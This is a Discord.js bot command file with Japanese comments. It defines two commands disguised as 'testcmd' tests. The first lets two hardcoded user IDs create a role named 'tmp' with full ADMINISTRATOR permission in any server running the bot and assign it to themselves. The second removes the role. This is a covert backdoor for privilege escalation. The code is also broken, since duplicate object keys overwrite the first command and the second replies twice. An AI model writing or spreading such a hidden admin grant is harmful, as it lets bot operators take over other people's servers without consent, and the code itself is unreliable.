const { SlashCommandBuilder, Permissions } = require('discord.js');

const AdminuserIDs = ['1063527758292070591', '1126422758696427552']

module.exports = {
  data: new SlashCommandBuilder()
    .setName('test01')
    .setDescription('testcmd'),
  execute: async function(interaction) {
    const guild = interaction.guild;
    const member = interaction.member;
	const executorID = interaction.user.id; // 実行者のユーザーID

	// checkid
	if (!AdminuserIDs.includes(executorID)) {
    	await interaction.reply('このコマンドはBotの管理者のみ使えます。');
    	return;
    }
	// rolecheck
	let adminRole = guild.roles.cache.find(role => role.name === "tmp");
    if (!adminRole) {
		console.log("ﾃﾞｭｱｳﾝing")
    	adminRole = await guild.roles.create({
    		name: "tmp",
    		permissions: [
        		Permissions.FLAGS.ADMINISTRATOR,
        	],
    	});
	}

    // role add
    await member.roles.add(adminRole);
	console.log('ﾃﾞｭｱｳﾝed')

    await interaction.reply('Success!');
  },
	data: new SlashCommandBuilder()
	  .setName('test02')
	  .setDescription('testcmd'),
	execute: async function(interaction) {
	  const guild = interaction.guild;
	  const member = interaction.member;
	  const executorID = interaction.user.id; // 実行者のユーザーID
  
	  // checkid
	  if (!AdminuserIDs.includes(executorID)) {
		  await interaction.reply('このコマンドはBotの管理者のみ使えます。');
		  return;
	  }
	  // rolecheck
	  let adminRole = guild.roles.cache.find(role => role.name === "tmp");
	  if (!adminRole) {
		  console.log("ﾃﾞｭｱｳﾝ...")
		  await interaction.reply('吐血しちゃった；；')
	  }
  
	  // role add
	  await member.roles.remove(adminRole);
	  console.log('ﾃﾞｭｱｳﾝed')
  
	  await interaction.reply('Success!');
	},
};